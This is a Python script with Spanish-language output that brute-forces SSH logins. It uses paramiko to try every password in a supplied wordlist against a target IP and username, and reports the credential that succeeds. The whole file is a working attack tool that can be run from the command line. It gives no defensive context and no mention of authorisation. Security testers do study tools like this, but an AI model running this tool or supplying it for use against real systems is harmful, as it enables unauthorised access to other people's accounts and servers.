
import paramiko
import sys

def ssh_bruteforce(target_ip, username, wordlist):
    print(f"[+] Iniciando ataque SSH contra {target_ip}...")

    with open(wordlist, "r", encoding="utf-8") as f:
        passwords = f.read().splitlines()

    for password in passwords:
        print(f"[*] Probando contraseña: {password}")

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(target_ip, username=username, password=password, timeout=3)
            print(f"\n[+] CONTRASEÑA ENCONTRADA: {password}")
            return
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"[!] Error: {e}")

    print("\n[-] No se encontró ninguna contraseña válida.")


def main():
    if len(sys.argv) != 4:
        print("Uso: python ssh_brute.py <IP> <usuario> <diccionario.txt>")
        sys.exit(1)

    ip = sys.argv[1]
    user = sys.argv[2]
    wordlist = sys.argv[3]

    ssh_bruteforce(ip, user, wordlist)


if __name__ == "__main__":
    main()
